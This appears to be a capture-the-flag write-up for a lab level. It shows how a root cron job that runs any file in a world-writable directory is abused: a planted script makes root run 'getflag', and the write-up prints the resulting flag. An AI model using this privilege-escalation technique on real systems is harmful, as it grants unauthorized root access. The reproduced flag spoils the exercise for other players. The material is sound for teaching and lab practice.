# Level05 Solution

## Steps:
1. Connected via SSH: `ssh level05@192.168.16.128 -p 4242`
2. Found a cron job in `/etc/cron.d/openarenaserver`:
   - Command: `cat /etc/cron.d/openarenaserver`
   - Content:
     ```
     */2 * * * * root /opt/openarenaserver/script.sh
     ```
   - This runs every 2 minutes as root.
3. Analyzed the script `/opt/openarenaserver/script.sh`:
   - Code:
     ```bash
     #!/bin/bash
     for i in /opt/openarenaserver/* ; do
         (ulimit -t 5; bash -x "$i")
         rm -f "$i"
     done
     ```
   - It executes every file in `/opt/openarenaserver/` with `bash -x` and then deletes it.
4. Exploited the cron job:
   - Created a malicious script in `/opt/openarenaserver/`:
     ```bash
     echo 'getflag > /tmp/flag05.txt' > /opt/openarenaserver/exploit.sh
     chmod +x /opt/openarenaserver/exploit.sh
     ```
   - Waited 2 minutes for the cron job to execute the script.
5. Retrieved the flag:
   - Command: `cat /tmp/flag05.txt`
   - Output: `viuaaale9huek52boumoomioc`

## Notes:
- The directory `/opt/openarenaserver/` is writable by the user `level05`.
- The cron job runs as root, so any script placed in that directory is executed with root privileges.
- The script is executed and then deleted, so we must write the output to a file (e.g., `/tmp/flag05.txt`).

## Tools used:
- `cat` (to view files)
- `echo` and `chmod` (to create the exploit script)
- Cron job exploitation

## Vulnerability:
- Misconfigured cron job that executes arbitrary files in a writable directory.